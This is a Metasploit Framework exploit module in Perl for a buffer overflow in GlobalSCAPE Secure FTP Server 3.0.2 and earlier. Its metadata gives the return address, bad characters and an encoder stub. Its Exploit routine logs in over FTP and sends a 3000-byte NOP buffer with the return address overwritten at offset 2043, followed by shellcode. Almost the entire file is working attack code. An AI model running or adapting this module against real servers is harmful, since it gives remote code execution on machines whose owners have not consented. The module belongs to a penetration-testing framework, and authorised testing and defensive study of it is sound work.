##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::globalscapeftp_user_input;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'GlobalSCAPE Secure FTP Server user input overflow',
	'Version'  => '$Revision: 1.2 $',
	'Authors'  =>
	  [
		'Fairuzan Roslan <riaf [at] mysec.org>',
		'Mati Aharoni <mati [at] see-security.com>',
	  ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,
	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'anonymous'],
		'PASS'  => [1, 'DATA', 'Password', 'metasploit@'],
	  },

	'Payload' =>
	  {
		'PrependEncoder'  => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
		'Space'    => 1000,
		'BadChars' => "\x00\x20".
		  join('', map { $_=chr($_) } (0x61 .. 0x7a)),
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
	This module exploits the buffer overflow found in the user-supplied
	input in GlobalSCAPE Secure FTP Server prior to 3.0.2. 
}),

	'Refs'  =>
	  [
		['OSVDB', 16049],
		['URL',   'http://archives.neohapsis.com/archives/fulldisclosure/2005-04/0674.html'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['GlobalSCAPE Secure FTP Server <= 3.0.2 Universal', 0x1002f01f ],
	  ],

	'Keys'  => ['gsftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $evil = $self->MakeNops(3000);
	substr($evil, 2043, 4, pack("V", $target->[1]));
	substr($evil, 2047, length($shellcode), $shellcode);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));

	my $r = $s->Recv(-1, 5);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	($r) = $r =~ m/^([^\n\r]+)(\r|\n)/;
	$self->PrintLine("[*] $r");

	$self->PrintLine("[*] Login as " .$self->GetVar('USER'). "/" .$self->GetVar('PASS'));
	$s->Send("USER ".$self->GetVar('USER')."\r\n");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }

	$s->Send("PASS ".$self->GetVar('PASS')."\r\n");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }

	$self->PrintLine("[*] Sending evil buffer....");
	$s->Send("$evil\r\n");
	$r = $s->Recv(-1, 5);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	return;
}


